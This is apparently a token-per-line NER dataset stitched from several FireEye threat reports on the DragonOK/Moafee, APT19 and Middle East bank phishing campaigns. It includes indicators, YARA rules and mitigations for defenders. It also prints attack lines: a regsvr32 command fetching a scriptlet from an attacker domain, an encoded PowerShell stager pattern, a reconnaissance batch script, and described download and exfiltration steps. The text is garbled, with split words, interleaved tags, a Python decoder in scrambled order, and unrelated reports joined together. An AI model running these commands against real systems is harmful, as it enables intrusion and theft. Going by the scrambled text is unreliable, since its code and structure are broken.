2013
and
August
8
,
2013
,
the
domain
www.ndbssh[.]com
served
as
a
command
and
control
server
for

Mongall
payloads
distributed
by
the

DragonOK  B_malware.infosteal
group
.
During
this
time
,

DragonOK  B_malware.infosteal
also
ran
an
HTRAN
proxy
client
on
www.ndbssh[.]com  B_url.unknown
.

This
HTRAN
client
was
seen
attempting
to
connect
to
three
different
HTRAN
servers
located
in
the
Jiangsu
province
and
operated
by
CHINANET
.

The
domain
www.ndbssh[.]com  B_url.unknown
resolved
to
206.161.216.219 B_ip.unknown
between
2013-09-28
and

DATE

HTRAN
Backend
2013-08-05
2013-08-04
2013-07-31
www.ndbssh.com  B_url.unknown
58.217.168.205  B_ip.unknown
www.ndbssh.com  B_url.unknown
222.95.171.178  B_ip.unknown
www.ndbssh.com  B_url.unknown
58.217.169.95 B_ip.unknown

HTRAN
Backend

Geolocation

CHINANET
JIANGSU

PROVINCE
NETWORK

CHINANET
JIANGSU

PROVINCE
NETWORK

CHINANET
JIANGSU

PROVINCE
NETWORK
2013-10-04
.
The
following
other
domains
were
seen
resolving
to
this
same
IP
:

DATE
2013-08-20
2013-09-06
2013-12-20
2013-12-20
2013-12-20
2013-12-20
2013-12-20
2013-12-20
2013-12-20

CNC
Domain
www.ghostale[.]com  B_url.cncsvr
www.ycbackap[.]com  B_url.cncsvr
asp.skyppee[.]com B_url.cncsvr
facebook.skyppee[.]com  B_url.cncsvr
pop.skyppee[.]com B_url.cncsvr
mail.skyppee[.]com  B_url.cncsvr
mil.skyppee[.]com B_url.cncsvr
web.pktmedia[.]com  B_url.cncsvr
bbs.pktmedia[.]com  B_url.cncsvr

The
DragonOK  B_malware.infosteal
group
was
observed
hosting
their
backend
HTRAN
servers
in
Jiangsu
.

This
observation
may
reveal
that
the
DragonOK  B_malware.infosteal
group
is
physically
located
in
the
Jiangsu
province
.

Conclusion

Based
on
the
geolocation
evidence
provided
in
this
paper
,
it
appears
that
different
operators
executed
the
Moafee  B_malware.infosteal
and

DragonOK  B_malware.infosteal
campaigns
.

This
conclusion
is
supported
by
the
following
assessments
:

The
campaigns
target
different
industries
in
different
geographic
locations
.

The
Moafee  B_malware.infosteal
campaign
targets
government
and
military
organizations
in
countries
with
national
interests
in
the
South
China
Sea
.

In
contrast
,
the
DragonOK  B_malware.infosteal
campaign
has
been
observed
targeting
high-technology
and
manufacturing
companies
in
Japan
and
Taiwan
.

The
campaigns
maintain
separate
back-end
command
and
control
infrastructures
hosted
in
different
provinces
in
Mainland
China
.

The
Moafee  B_malware.infosteal
campaign
can
be
traced
to
infrastructure
located
in
the
Guangdong
province
,
whereas
the
DragonOK  B_malware.infosteal
campaign
can
be
traced
to
infrastructure
located
in
the

Jiangsu
province
.

While
it
seems
that
different
operators
are
responsible
for
these
two
campaigns
,
our
research
showed
that
these
operators
share
a
number
of
common
tools
,
techniques
and
procedures
(
TTPs
)
.

We
also
believe
a
separate
third
group
is
using
these
TTPs
but
we
do
not
have
sufficient
insight
to
this
operator
at
this
time
.

The
shared
TTPs
include
:
•
Usage
of
the
same
custom
backdoors
and

RATs  B_malware.backdoor
such
as
CT/NewCT/NewCT2
,

Mongall
,
Nflog B_malware.backdoor
,
as
well
as
off-the-shelf

RATs  B_malware.backdoor
such
as
PoisonIvy
,
to
maintain
access
to
the
victims
'
networks
.

•
Usage
of
HTRAN
to
proxy
their
command
and
control
communication
.

•
Usage
of
the
same
evasion
techniques
to
evade
detection
such
as
environment
checks
based
on
CPU
cores
,
password
protected
documents
,
and
the
use
of
large
null
padded
files
.

We
assess
that
these
shared
TTPs
may
be
the
result
of
:
•
A
direct
relationship
between
the
operators
.

•
An
indirect
relationship
such
as
the
completion
of
a
common
training
regimen
.

•
A
common
quartermaster
or
supply-chain
for
their
malware
tools
.

Acknowledgements
:

We
would
like
to
thank
Ronghwa
Chong
,
Nart

Villeneuve
,
Darien
Kindlund
,
Kenneth
Gears
and
Jonathan
Wrolstad
for
their
insight
,
research
and
support
.
21
http://technet.microsoft.com/en-us/library/hh849687.aspx  B_url.normal
22
http://technet.microsoft.com/en-us/library/hh847739.aspx  B_url.normal

Appendix
A
:
Python
Routine
to
Decode
NewCT
and
CT
Beacons
def
dexor(data,key
)
:
buffer
=
'
'
keylen
=
len(key
)
for
i
in
range(0,len(data
)
)
:
return
buffer
buffer
+=
chr(ord(data[i]
)
^
ord(key[i
%
keylen]
)
)
try
:
except
:
continue
return
0
inverted
+=
chr(~ord(byte
)
&
0xFF
)
def
decrypt(data
)
:
inverted
=
'
'
for
byte
in
data
:
beacon
=
'
\\x
'
+
'
\\x'.join('{0:x}'.format(ord(c
)
)
for
c
in
inverted[0:4]
)
dexor(data2,key
)
+
'
|
'
+
values[6]
end_marker
=
'
index
'
end
=
inverted.find(end_marker,0
)
+
len(end_marker
)
+
4
values
=
inverted[:end].split('/
'
)
if
len(values
)
<
7
:
key
=
values[1]
data1
=
binascii.unhexlify(values[3].replace('%
'
,
'
)
)
data2
=
binascii.unhexlify(values[5].replace('%
'
,
'
)
)
c2_end
=
values[0].find('\x00
'
)
-
1
c2
=
values[0][4:c2_end]
return
beacon
+
'
|
'
+
c2
+
'
|
'
+
dexor(data1,key
)
+
'
|
'
+

Appendix
B
:
Campaign
codes
embedded
in
NewCT/CT  B_malware.backdoor

First
stage
payload

Version

Implant

Implant
Name

C2
Server

Campaign
code
46e55cdf507ef10b  B_hash
11d74dad6af8b94e  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

MSSoap.DLL
989d04ab23385260  B_hash
a402ce7b6751e60e  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

MSSoap.DLL
6de67d5bfe61fbdc  B_hash
2febfd289e9660c3  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

MSSoap.DLL
http.jpaols[.]  B_url.cncsvr

facebook  B_url.cncsvr
.
pktmedia[.]com  I

facebook  B_url.cncsvr
.
skyppee[.]com I

http.jpaols[.]  B_url.cncsvr
hc_NewCT
face_NewCT
jp80_NewCT
908d847fd39a2851  B_hash
85b3f0e8dc874dad  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

MSSoap.DLL
sslc.moafee[.]  B_url.cncsvr
sslc_NewCT
26a48ee15b8f976d  B_hash
b35e219428e05ef3  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

MSSoap.DLL
http.jpaols[.]  B_url.cncsvr
jp80_NewCT
bd5ed9168632e6da  B_hash
a6bcee6b6c48d60f  I

NewCT2  B_malware.backdoor
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

BurnDCSrv
.
butitistrun
.
blogdns[.]com B_url.cncsvr
lcl918_NewCT
46ac122183c32858  B_hash
581e95ef40bd31b3  I

CT
V2.1
81998ee8b8f8304d  B_hash
038e3cb5ff10b4d2  I

IntelAMTPP
.
ct.datangcun[.] B_url.cncsvr
20120509_CT

V2.1

Appendix
C
:
Moafee  B_malware.infosteal
and
DragonOK  B_malware.infosteal
Clusters

About
FireEye
,
Inc
.

FireEye
has
invented
a
purpose-built
,
virtual
machine-based
security
platform
that
provides
real-time
threat
protection
to
enterprises
and
governments
worldwide
against
the
next
generation
of
cyber
attacks
.

These
highly
sophisticated
cyber
attacks
easily
circumvent
traditional
signature-based
defenses
,
such
as
next-generation
firewalls
,
IPS
,
anti-virus
,
and
gateways
.

The
FireEye
Threat
Prevention
Platform
provides
real-time
,
dynamic
threat
protection
without
the
use
of
signatures
to
protect
an
organization
across
the
primary
threat
vectors
and
across
the
different
stages
of
an
attack
life
cycle
.

The
core
of
the
FireEye
platform
is
a
virtual
execution
engine
,
complemented
by
dynamic
threat
intelligence
,
to
identify
and
block
cyber
attacks
in
real
time
.

FireEye
has
over
1,900
customers
across
more
than
60
countries
,
including
over
130
of
the

Fortune
500
.
Privileges
and
Credentials
:
Phished
at
the
Request
of
Counsel

Summary

In
May
and
June
2017
,
FireEye
observed
a
phishing
campaign
targeting
at
least
seven
global
law
and
investment
firms
.
We
have
associated
this
campaign
with
APT19 B_malware.infosteal
,
a
group
that
we
assess
is
composed
of
freelancers
,
with
some
degree
of
sponsorship
by
the
Chinese
government
.

APT19 B_malware.infosteal
used
three
different
techniques
to
attempt
to
compromise
targets
.
In
early
May
,
the
phishing  B_malware.infosteal
lures I
leveraged
RTF
attachments
that
exploited
the
Microsoft
Windows
vulnerability
described
in
CVE
2017-0199
.
Toward
the
end
of
May
,
APT19 B_malware.infosteal
switched
to
using
macro-enabled
Microsoft
Excel
(
XLSM
)
documents
.
In
the
most
recent
versions
,

APT19 B_malware.infosteal
added
an
application
whitelisting
bypass
to
the
XLSM
documents
.
At
least
one
observed
phishing  B_malware.infosteal
lures I
delivered
a
Cobalt
Strike
payload
.

As
of
the
writing
of
this
blog
post
,
FireEye
had
not
observed
post-exploitation
activity
by
the
threat
actors
,
so
we
cannot
assess
the
goal
of
the
campaign
.
We
have
previously
observed
APT19 B_malware.infosteal
steal
data
from
law
and
investment
firms
for
competitive
economic
purposes
.

This
purpose
of
this
blog
post
is
to
inform
law
firms
and
investment
firms
of
this
phishing
campaign
and
provide
technical
indicators
that
their
IT
personnel
can
use
for
proactive
hunting
and
detection
.

The
Emails

APT19 B_malware.infosteal
phishing
emails
from
this
campaign
originated
from
sender
email
accounts
from
the
'
@cloudsend[.]net
'
domain
and
used
a
variety
of
subjects
and
attachment
names
.
Refer
to
the
Indicators
of
Compromise
section
for
more
details
.

The
Attachments

APT19 B_malware.infosteal
leveraged
Rich
Text
Format
(
RTF
)
and
macro-enabled
Microsoft
Excel
(
XLSM
)
files
to
deliver
their
initial
exploits
.
The
following
sections
describe
the
two
methods
in
further
detail
.

RTF
Attachments

Through
the
exploitation
of
the
HTA
handler
vulnerability
described
in
CVE-2017-1099
,
the
observed
RTF
attachments
download
hxxp://tk-in-f156.2bunny[.]com/Agreement.doc  B_url.distribute
.
Unfortunately
,
this
file
was
no
longer
hosted
at
tk-in-f156.2bunny[.]com B_url.unknown
for
further
analysis
.
Figure
1
is
a
screenshot
of
a
packet
capture
showing
one
of
the
RTF
files
reaching
out
to
hxxp://tk-in-f156.2bunny[.]com/Agreement.doc  B_url.distribute
.

Figure
1
:
RTF
PCAP

XLSM
Attachments

The
XLSM
attachments
contained
multiple
worksheets
with
content
that
reflected
the
attachment
name
.
The
attachments
also
contained
an
image
that
requested
the
user
to
'
Enable
Content
'
,
which
would
enable
macro
support
if
it
was
disabled
.
Figure
2
provides
a
screenshot
of
one
of
the
XLSM
files
(
MD5:30f149479c02b741e897cdb9ecd22da7  B_hash
)
.

Figure
2
:
Enable
macros

One
of
the
malicious
XLSM
attachments
that
we
observed
contained
a
macro
that
:
1
.
Determined
the
system
architecture
to
select
the
correct
path
for
PowerShell
2
.
Launched
a
ZLIB
compressed
and
Base64
encoded
command
with
PowerShell
.
This
is
a
typical
technique
used
by
Meterpreter
stagers
.

Figure
3
depicts
the
macro
embedded
within
the
XLSM
file
(
MD5
:
38125a991efc6ab02f7134db0ebe21b6  B_hash
)
.

Figure
3
:
XLSX
Macro

Figure
4
contains
the
decoded
output
of
the
encoded
text
.

Figure
4
:
Decoded
ZLIB
+
Base64
payload

The
shellcode
invokes
PowerShell
to
issue
a
HTTP
GET
request
for
a
random
four
(
4
)
character
URI
on
the
root
of
autodiscovery[.]2bunny[.]com  B_url.unknown
.
The
requests
contain
minimal
HTTP
headers
since
the
PowerShell
command
is
executed
with
mostly
default
parameters
.
Figure
5
depicts
an
HTTP
GET
request
generated
by
the
payload
,
with
minimal
HTTP
headers
.

Figure
5
:
GET
Request
with
minimal
HTTP
headers

Converting
the
shellcode
to
ASCII
and
removing
the
non-printable
characters
provides
a
quick
way
to
pull
out
network-based
indicators
(
NBI
)
from
the
shellcode
.
Figure
6
shows
the
extracted
NBIs
.

Figure
6
:
Decoded
shellcode

FireEye
also
identified
an
alternate
macro
in
some
of
the
XLSM
documents
,
displayed
in
Figure
7
.

Figure
7
:
Alternate
macro

This
macro
uses
Casey
Smith's
'
Squiblydoo
'
Application
Whitelisting
bypass
technique
to
run
the
command
in

Figure
8
.

Figure
8
:
Application
Whitelisting
Bypass

The
command
in
Figure
8
downloads
and
launches
code
within
an
SCT
file
.
The
SCT
file
in
the
payload
(
MD5
:
1554d6fe12830ae57284b389a1132d65  B_hash
)
contained
the
code
shown
in
Figure
9
.

Figure
9
:
SCT
contents

Figure
10
provides
the
decoded
script
.
Notice
the
'
$DoIt
'
string
,
which
is
usually
indicative
of
a
Cobalt
Strike
payload
.

Figure
10
:
Decoded
SCT
contents

A
quick
conversion
of
the
contents
of
the
variable
'
$var_code
'
from
Base64
to
ASCII
shows
some
familiar
network
indicators
,
shown
in
Figure
11
.

Figure
11
:
$var_code
to
ASCII

Second
Stage
Payload

Once
the
XLSM
launches
its
PowerShell
command
,
it
downloads
a
typical
Cobalt
Strike
BEACON
payload
,
configured
with
the
following
parameters
:

Process
Inject
Targets
:
%windir%\syswow64\rundll32.exe
%windir%\sysnative\rundll32.exe
c2_user_agents

Mozilla/5.0
(
compatible;
MSIE
9.0;
Windows
NT
6.1;
Trident/5.0;
FunWebProducts;

IE0006_ver1;EN_GB
)

Named
Pipes
\\%s\pipe\msagent_%x
beacon_interval
autodiscover.2bunny[.]com/submit.php  B_url.distribute
autodiscover.2bunny[.]com/IE9CompatViewList.xml  B_url.distribute
sfo02s01-in-f2.cloudsend[.]net/submit.php  B_url.distribute
sfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml  B_url.distribute

C2
Port

TCP/80

Figure
12
depicts
an
example
of
a
BEACON
C2
attempt
from
this
payload
.

Figure
12
:
Cobalt
Strike
BEACON
C2

FireEye
Product
Detections

The
following
FireEye
products
currently
detect
and
block
the
methods
described
above
.
Table
1
lists
the
current
detection
and
blocking
capabilities
by
product
.

Detection
Name

Product

Action
Notes

SUSPICIOUS
POWERSHELL
USAGE
(
METHODOLOGY
)
HX

Detect
XSLM
Macro
launch

Gen:Variant.Application.HackTool.CobaltStrike.1

Malware
Object

Backdoor.BEACON

FE_Malformed_RTF

Malware.Binary.rtf

Malware.Binary

Malware.Binary.xlsx

Table
1
:
Detection
review
*Appliances
must
be
configured
for
block
mode
.

Recommendations

Detect
XSLM
Macro
launch

Detect
BEACON
written
to
disk

Block*
BEACON
Callback

EX/ETP/NX
Block*
RTF

EX/ETP/NX
Block*
RTF

EX/ETP/NX
Block*
RTF

EX/ETP/NX
Block*
XSLM

FireEye
recommends
organizations
perform
the
following
steps
to
mitigate
the
risk
of
this
campaign
:
1
.
Microsoft
Office
users
should
apply
the
patch
from
Microsoft
as
soon
as
possible
,
if
they
have
not
already
installed
it
.
2
.
Search
historic
and
future
emails
that
match
the
included
indicators
of
compromise
.
3
.
Review
web
proxy
logs
for
connections
to
the
included
network
based
indicators
of
compromise
.
4
.
Block
connections
to
the
included
fully
qualified
domain
names
.
5
.
Review
endpoints
for
the
included
host
based
indicators
of
compromise
.

Indicators
of
Compromise

The
following
section
provides
the
IOCs
for
the
variants
of
the
phishing
emails
and
malicious
payloads
that
FireEye
has
observed
during
this
campaign
.

Email
Senders

PressReader
<infodept@cloudsend[.]net>

Angela
Suh
<angela.suh@cloudsend[.]net>

Ashley
Safronoff
<ashley.safronoff@cloudsend[.]net>

Lindsey
Hersh
<lindsey.hersh@cloudsend[.]net>

Sarah
Roberto
sarah.roberto@cloudsend[.]net
noreply@cloudsend[.]net

Email
Subject
Lines

Macron
Denies
Authenticity
Of
Leak
,
French
Prosecutors
Open
Probe

Macron
Document
Leaker
Releases
New
Images
,
Promises
More
Information

Are
Emmanuel
Macron's
Tax
Evasion
Documents
Real
?

Time
Allocation

Vacancy
Report
china
paper
table
and
graph
results
with
zeros
–
some
ready
not
all
finished

Macron
Leaks
contain
secret
plans
for
the
islamisation
of
France
and
Europe

Attachment
Names

Macron_Authenticity.doc.rtf

Macron_Information.doc.rtf

US
and
EU
Trade
with
China
and
China
CA.xlsm

Tables
4
5
7
Appendix
with
zeros.xlsm

Project
Codes
-
05.30.17.xlsm

Weekly
Vacancy
Status
Report
5-30-15.xlsm

Macron_Tax_Evasion.doc.rtf

Macron_secret_plans.doc.rtf

Network
Based
Indicators
(
NBI
)
lyncdiscover.2bunny[.]com B_url.unknown
autodiscover.2bunny[.]com B_url.unknown
lyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/ B_url.unknown
lyncdiscover.2bunny[.]com/Autodiscover B_url.unknown
autodiscover.2bunny[.]com/K5om B_url.unknown
sfo02s01-in-f2.cloudsend[.]net/submit.php B_url.unknown
sfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml B_url.unknown
tk-in-f156.2bunny[.]com B_url.unknown
tk-in-f156.2bunny[.]com/Agreement.doc B_url.unknown
104.236.77[.]169  B_ip.unknown
138.68.45[.]9  B_ip.unknown
162.243.143[.]145  B_ip.unknown
Mozilla/5.0
(
compatible;
MSIE
9.0;
Windows
NT
6.1;
Trident/5.0;
FunWebProducts;
IE0006_ver1;EN_GB
)
tf-in-f167.2bunny[.]com:443
(
*Only
seen
in
VT
not
ITW
)

Host
Based
Indicators
(
HBI
)

RTF
MD5
hash
values
0bef39d0e10b1edfe77617f494d733a8  B_hash
0e6da59f10e1c4685bb5b35a30fc8fb6  B_hash
cebd0e9e05749665d893e78c452607e2  B_hash

XLSX
MD5
hash
values
38125a991efc6ab02f7134db0ebe21b6  B_hash
3a1dca21bfe72368f2dd46eb4d9b48c4  B_hash
30f149479c02b741e897cdb9ecd22da7  B_hash

BEACON
and
Meterpreter
payload
MD5
hash
values
bae0b39197a1ac9e24bdf9a9483b18ea  B_hash
1151619d06a461456b310096db6bc548  B_hash

Process
arguments
,
named
pipes
,
and
file
paths
powershell.exe
-NoP
-NonI
-W
Hidden
-Command
'
Invoke-Expression
$(New-Object
IO.StreamReader
(
$(New-Object
IO.Compression.DeflateStream
(
$(New-Object
IO.MemoryStream
(
,$([Convert]::FromBase64String('<base64
blob>
'
)
regsvr32.exe
/s
/n
/u
/i:hxxps://lyncdiscover.2bunny.com/Autodiscover
scrobj.dll
\\<ip>\pipe\msagent_<4
digits>

C:\Documents
and
Settings\<user>\Local
Settings\Temp\K5om.dll
(
4
character
DLL
based
on
URI
of
original

GET
request
)

Yara
Rules
rule
FE_LEGALSTRIKE_MACRO
{
meta:version='.1
'
filetype='MACRO
'
author='Ian.Ahl@fireeye.com
@TekDefense
'
date='2017-06-02
'
description='This
rule
is
designed
to
identify
macros
with
the
specific
encoding
used
in
the
sample
30f149479c02b741e897cdb9ecd22da7
.
'
strings
:
//
OBSFUCATION
$ob1
=
'
ChrW(114
)
&
ChrW(101
)
&
ChrW(103
)
&
ChrW(115
)
&
ChrW(118
)
&
ChrW(114
)
&
ChrW(51
)
&

ChrW(50
)
&
ChrW(46
)
&
ChrW(101
)
'
ascii
wide
$ob2
=
'
ChrW(120
)
&
ChrW(101
)
&
ChrW(32
)
&
ChrW(47
)
&
ChrW(115
)
&
ChrW(32
)
&
ChrW(47
)
&

ChrW(110
)
&
ChrW(32
)
&
ChrW(47
)
'
ascii
wide
$ob3
=
'
ChrW(117
)
&
ChrW(32
)
&
ChrW(47
)
&
ChrW(105
)
&
ChrW(58
)
&
ChrW(104
)
&
ChrW(116
)
&

ChrW(116
)
&
ChrW(112
)
&
ChrW(115
)
'
ascii
wide
$ob4
=
'
ChrW(58
)
&
ChrW(47
)
&
ChrW(47
)
&
ChrW(108
)
&
ChrW(121
)
&
ChrW(110
)
&
ChrW(99
)
&

ChrW(100
)
&
ChrW(105
)
&
ChrW(115
)
'
ascii
wide
$ob5
=
'
ChrW(99
)
&
ChrW(111
)
&
ChrW(118
)
&
ChrW(101
)
&
ChrW(114
)
&
ChrW(46
)
&
ChrW(50
)
&

ChrW(98
)
&
ChrW(117
)
&
ChrW(110
)
'
ascii
wide
$ob6
=
'
ChrW(110
)
&
ChrW(121
)
&
ChrW(46
)
&
ChrW(99
)
&
ChrW(111
)
&
ChrW(109
)
&
ChrW(47
)
&

ChrW(65
)
&
ChrW(117
)
&
ChrW(116
)
'
ascii
wide
$ob7
=
'
ChrW(111
)
&
ChrW(100
)
&
ChrW(105
)
&
ChrW(115
)
&
ChrW(99
)
&
ChrW(111
)
&
ChrW(118
)
&

ChrW(101
)
&
ChrW(114
)
&
ChrW(32
)
'
ascii
wide
$ob8
=
'
ChrW(115
)
&
ChrW(99
)
&
ChrW(114
)
&
ChrW(111
)
&
ChrW(98
)
&
ChrW(106
)
&
ChrW(46
)
&

ChrW(100
)
&
ChrW(108
)
&
ChrW(108
)
'
ascii
wide
$obreg1
=
/(\w{5}\s&\s){7}\w{5}/
$obreg2
=
/(Chrw\(\d{1,3}\)\s&\s){7}/
//
wscript
$wsobj1
=
'
Set
Obj
=
CreateObject(\'WScript.Shell\
'
)
'
ascii
wide
$wsobj2
=
'
Obj.Run
'
ascii
wide
condition
:
(
uint16(0
)
!=
0x5A4D
)
all
of
(
$wsobj*
)
and
3
of
(
$ob*
)
all
of
(
$wsobj*
)
and
all
of
(
$obreg*
)
rule
FE_LEGALSTRIKE_MACRO_2
{
meta:version='.1
'
filetype='MACRO
'
author='Ian.Ahl@fireeye.com
@TekDefense
'
date='2017-06-02
'
description='This
rule
was
written
to
hit
on
specific
variables
and
powershell
command
fragments
as
seen
in
the
macro
found
in
the
XLSX
file3a1dca21bfe72368f2dd46eb4d9b48c4
.
'
strings
:
//
Setting
the
environment
$env1
=
'
Arch
=
Environ(\'PROCESSOR_ARCHITECTURE\
'
)
'
ascii
wide
$env2
=
'
windir
=
Environ(\'windir\
'
)
'
ascii
wide
$env3
=
'
windir
+
\'\\syswow64\\windowspowershell\\v1.0\\powershell.exe\
'
'
ascii
wide
//
powershell
command
fragments
$ps1
=
'
-NoP
'
ascii
wide
$ps2
=
'
-NonI
'
ascii
wide
$ps3
=
'
-W
Hidden
'
ascii
wide
$ps4
=
'
-Command
'
ascii
wide
$ps5
=
'
New-Object
IO.StreamReader
'
ascii
wide
$ps6
=
'
IO.Compression.DeflateStream
'
ascii
wide
$ps7
=
'
IO.MemoryStream
'
ascii
wide
$ps8
=
'
,$([Convert]::FromBase64String
'
ascii
wide
$ps9
=
'
ReadToEnd();
'
ascii
wide
$psregex1
=
/\W\w+\s+\s\'.+\'/
condition
:
(
uint16(0
)
!=
0x5A4D
)
all
of
(
$env*
)
and
6
of
(
$ps*
)
all
of
(
$env*
)
and
4
of
(
$ps*
)
and
all
of
(
$psregex*
)
rule
FE_LEGALSTRIKE_RTF
{
meta
:
version='.1
'
filetype='MACRO
'
author='joshua.kim@FireEye.com
'
date='2017-06-02
'
description='Rtf
Phishing
Campaign
leveraging
the
CVE
2017-0199
exploit
,
to
point
to
the
domain
2bunnyDOTcom
'
strings
:
$header
=
'
{\\rt
'
$lnkinfo
=
'
4c0069006e006b0049006e0066006f
'
$encoded1
=
'
4f4c45324c696e6b
'
$encoded2
=
'
52006f006f007400200045006e007400720079
'
$encoded3
=
'
4f0062006a0049006e0066006f
'
$encoded4
=
'
4f006c0065
'
$http1
=
'
68{
'
$http2
=
'
74{
'
$http3
=
'
07{
'
//
2bunny.com
$domain1
=
'
32{\\
'
$domain2
=
'
62{\\
'
$domain3
=
'
75{\\
'
$domain4
=
'
6e{\\
'
$domain5
=
'
79{\\
'
$domain6
=
'
2e{\\
'
$domain7
=
'
63{\\
'
$domain8
=
'
6f{\\
'
$domain9
=
'
6d{\\
'
$datastore
=
'
\\*\\datastore
'
condition
:
$header
at
0
and
all
of
them

Acknowledgements

Joshua
Kim
,
Nick
Carr
,
Gerry
Stellatos
,
Charles
Carmakal
,
TJ
Dahms
,
Nick
Richard
,
Barry
Vengerik
,
Justin
Prosco
,

Christopher
Glyer
Targeted
Attacks
against
Banks
in
the
Middle
East
'
Threat
Research
Blog

Introduction

In
the
first
week
of
May
2016
,
FireEye's
DTI
identified
a
wave
of
emails
containing
malicious
attachments
being
sent
to
multiple
banks
in
the
Middle
East
region
.

The
threat
actors
appear
to
be
performing
initial
reconnaissance
against
would-be
targets
,
and
the
attacks
caught
our
attention
since
they
were
using
unique
scripts
not
commonly
seen
in
crimeware
campaigns
.

In
this
blog
we
discuss
in
detail
the
tools
,
tactics
,
techniques
and
procedures
(
TTPs
)
used
in
these
targeted
attacks
.

Delivery
Method

The
attackers
sent
multiple
emails
containing
macroenabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
The
themes
of
the
messages
used
in
the
attacks
are
related
to
IT
Infrastructure
such
as
a
log
of
Server
Status
Report
or
a
list
of
Cisco

Iron
Port
Appliance
details
.
In
one
case
,
the
content
of
the
email
appeared
to
be
a
legitimate
email
conversation
between
several
employees
,
even
containing
contact
details
of
employees
from
several
banks
.
This
email
was
then
forwarded
to
several
people
,
with
the
malicious
Excel
file
attached
.

Macro B_malware.infosteal
Details

The
macro B_malware.infosteal
first
calls
an
Init
(
)
function
(
shown
in
Figure
1
)
that
performs
the
following
malicious
activities
:

1
.
Extracts
base64-encoded
content
from
the
cells
within
a
worksheet
titled
'
Incompatible
'
.
2
.
Checks
for
the
presence
of
a
file
at
the
path
%PUBLIC%\Libraries\
update.vbs
.
If
the
file
is
not
present
,
the
macro B_malware.infosteal
creates
three
different
directories
under
%PUBLIC%\Libraries
,
namely
up
,
dn
,
and
tp
.

3
.
The
extracted
content
from
step
one
is
decoded
using
PowerShell
and
dropped
into
two
different
files
:
%PUBLIC%\Libraries\update.vbs
and
%PUBLIC%\Libraries\dns.ps1
4
.
The
macro B_malware.infosteal
then
creates
a
scheduled
task
with
name
:
GoogleUpdateTaskMachineUI
,
which
executes
update.vbs
every
three
minutes
.

Note
:
Due
to
the
use
of
a
hardcoded
environment
variable
%PUBLIC%
in
the
macro B_malware.infosteal
code  I
,
the
macro B_malware.infosteal
will
only
run
successfully
on
Windows
Vista
and
subsequent
versions
of
the
operating
system
.

Figure
1
:
Macro B_malware.infosteal
Init
(
)
subroutine

Run-time
Unhiding
of
Content

One
of
the
interesting
techniques
we
observed
in
this
attack
was
the
display
of
additional
content
after
the
macro B_malware.infosteal
executed
successfully
.
This
was
done
for
the
purpose
of
social
engineering
–
specifically
,
to
convince
the
victim
that
enabling
the
macro B_malware.infosteal
did
in
fact
result
in
the
'
unhiding
'
of
additional
spreadsheet
data
.

Office
documents
containing
malicious
macros
are
commonly
used
in
crimeware
campaigns
.
Because
default
Office
settings
typically
require
user
action
in
order
for
macros
to
run
,
attackers
may
convince
victims
to
enable
risky
macro
code
by
telling
them
that
the
macro B_malware.infosteal
is
required
to
view
'
protected
content
.
'

In
crimeware
campaigns
,
we
usually
observe
that
no
additional
content
is
displayed
after
enabling
the
macros B_malware.infosteal
.
However
,
in
this
case
,
attackers
took
the
extra
step
to
actually
hide
and
unhide
worksheets
when
the
macro B_malware.infosteal
is
enabled
to
allay
any
suspicion
.
A
screenshot
of
the
worksheet
before
and
after
running
the
macro B_malware.infosteal
is
shown
in
Figure
2
and
Figure
3
,
respectively
.

Figure
2
:
Before
unhiding
of
content

Figure
3
:
After
unhiding
of
content

In
the
following
code
section
,
we
can
see
that
the
subroutine
ShowHideSheets
(
)
is
called
after
the
Init
(
)
subroutine
executes
completely
:

Private
Sub
Workbook_Open
(
)
Call
Init
Call
ShowHideSheets
End
Sub

The
code
of
subroutine
ShowHideSheets
(
)
,
which
unhides
the
content
after
completion
of
malicious
activities
,
is
shown
in
Figure
4
.

Figure
4
:
Macro B_malware.infosteal
used
to
unhide
content
at
runtime

First
Stage
Download

After
the
macro B_malware.infosteal
successfully
creates
the
scheduled
task
,
the
dropped
VBScript
,
update.vbs
(
Figure
5
)
,
will
be
launched
every
three
minutes
.
This
VBScript
performs
the
following
operations
:
1
.
Leverages
PowerShell
to
download
content
from
the
URI
hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\dwn&m=d  B_url.unknown
and
saves
it
in
the
directory
%PUBLIC%\Libraries\dn
.

2
.
Uses
PowerShell
to
download
a
BAT
file
from
the
URI
hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\bat&m=d  B_url.unknown
and
saves
it
in
the
directory
%PUBLIC%\Libraries\dn
.
3
.
Executes
the
BAT
file
and
stores
the
results
in
a
file
in
the
path
%PUBLIC%\Libraries\up
.
4
.
Uploads
this
file
to
the
server
by
sending
an
HTTP

POST
request
to
the
URI
hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\upl&m=u  B_url.cncsvr
.
5
.
Finally
,
it
executes
the
PowerShell
script
dns.ps1
,
which
is
used
for
the
purpose
of
data
exfiltration
using
DNS
.

Figure
5
:
Content
of
update.vbs

During
our
analysis
,
the
VBScript
downloaded
a
customized
version
of
Mimikatz
in
the
previously
mentioned
step
one
.
The
customized
version
uses
its
own
default
prompt
string
as
well
as
its
own
console
title
,
as
shown
in
Figure
6
.

Figure
6
:
Custom
version
of
Mimikatz
used
to
extract
user
password
hashes

Similarly
,
the
contents
of
the
BAT
file
downloaded
in
step
two
are
shown
in
Figure
7
:

whoami
&
hostname
&
ipconfig
/all
&
net
user
/domain
2>&1
&
net
group
/domain
2>&1
&
net
group
'
domain
admins
'
/domain
2>&1
&
net
group
'
Exchange
Trusted
Subsystem
'
/domain
2>&1
&
net
accounts
/domain
2>&1
&
net
user
2>&1
&
net
localgroup
administrators
2>&1
&
netstat
-an
2>&1
&
tasklist
2>&1
&
sc
query
2>&1
&
systeminfo
2>&1
&
reg
query
'
HKEY_CURRENT_USER\Software\Microsoft\Terminal

Server
Client\Default
'
2>&1

Figure
7
:
Content
of
downloaded
BAT
script

This
